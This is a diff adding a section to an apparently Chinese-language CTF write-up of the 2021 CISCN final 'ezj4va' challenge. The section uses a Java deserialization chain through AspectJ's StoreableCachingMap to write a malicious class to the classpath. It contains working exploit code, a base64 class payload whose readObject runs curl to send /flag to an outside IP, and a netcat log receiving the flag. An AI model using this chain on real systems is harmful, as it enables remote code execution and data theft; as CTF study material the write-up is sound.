@@ -168,7 +168,83 @@ HashSet.readObject()
 
 
 
+--------------------------------------------------分割线---------------------------------------------
 
+后来偶然发现buu上这题还上了加固，直接ssh连上去看了一下，发现`./`目录不是`/app/`目录，而是`/app/bin`目录，导致写错了。
+
+改成`/app/target/classes/`即可。
+
+写Evil.java：
+
+```java
+import java.io.Serializable;
+
+public class Evil implements Serializable {
+    private void readObject(java.io.ObjectInputStream s) throws Exception{
+        Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","curl http://121.5.169.223:39555 -F file=@/flag"});
+    }
+}
+
+```
+
+```shell
+javac Evil.java
+cat Evil.class|base64 -w 0
+```
+
+```java
+        Class clazz = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
+        Constructor declaredConstructor = clazz.getDeclaredConstructor(String.class,int.class);
+        declaredConstructor.setAccessible(true);
+        Map<String,Object> expMap = (Map<String,Object>)declaredConstructor.newInstance("/app/target/classes/", 123);
+
+        Cart cart = new Cart();
+        Field skuDescribeField = Cart.class.getDeclaredField("skuDescribe");
+        skuDescribeField.setAccessible(true);
+        skuDescribeField.set(cart,expMap);
+
+        Cart toAdd = new Cart();
+        Map<String,Object> fileMap = new HashMap<>();
+        String content = "yv66vgAAADQAJgoACQAVCgAWABcHABgIABkIABoIABsKABYAHAcAHQcAHgcAHwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApyZWFkT2JqZWN0AQAeKExqYXZhL2lvL09iamVjdElucHV0U3RyZWFtOylWAQAKRXhjZXB0aW9ucwcAIAEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAsADAcAIQwAIgAjAQAQamF2YS9sYW5nL1N0cmluZwEABy9iaW4vc2gBAAItYwEALmN1cmwgaHR0cDovLzEyMS41LjE2OS4yMjM6Mzk1NTUgLUYgZmlsZT1AL2ZsYWcMACQAJQEABEV2aWwBABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAIAAkAAQAKAAAAAgABAAsADAABAA0AAAAdAAEAAQAAAAUqtwABsQAAAAEADgAAAAYAAQAAAAMAAgAPABAAAgANAAAANwAFAAIAAAAbuAACBr0AA1kDEgRTWQQSBVNZBRIGU7YAB1exAAAAAQAOAAAACgACAAAABQAaAAYAEQAAAAQAAQASAAEAEwAAAAIAFA==";
+        fileMap.put("Evil.class",Base64.getDecoder().decode(content));
+        skuDescribeField.set(toAdd,fileMap);
+
+        System.out.println(Base64.getEncoder().encodeToString(SerializeUtil.serialize(cart)));
+        System.out.println(Base64.getEncoder().encodeToString(SerializeUtil.serialize(toAdd)));
+
+        Evil evil = new Evil();
+        System.out.println(Base64.getEncoder().encodeToString(SerializeUtil.serialize(evil)));
+```
+
+先往classpath里面写Evil.class，然后再反序列化Evil类即可。
+
+![image-20220304153425788](2021-CISCN-fianl-ezj4va.assets/image-20220304153425788.png)
+
+![image-20220304153546066](2021-CISCN-fianl-ezj4va.assets/image-20220304153546066.png)
+
+
+
+```shell
+root@VM-0-6-ubuntu:~/java/jndi# nc -lvvp 39555
+Listening on [0.0.0.0] (family 0, port 39555)
+Connection from 117.21.200.166 18524 received!
+POST / HTTP/1.1
+Host: 121.5.169.223:39555
+User-Agent: curl/7.58.0
+Accept: */*
+Content-Length: 235
+Content-Type: multipart/form-data; boundary=------------------------2f8c76b85a50abe1
+
+--------------------------2f8c76b85a50abe1
+Content-Disposition: form-data; name="file"; filename="flag"
+Content-Type: application/octet-stream
+
+flag{c3b9785bd11defffc900569c778bd61c}
+
+--------------------------2f8c76b85a50abe1--
+
+
+```
 
 ## 参考链接
 
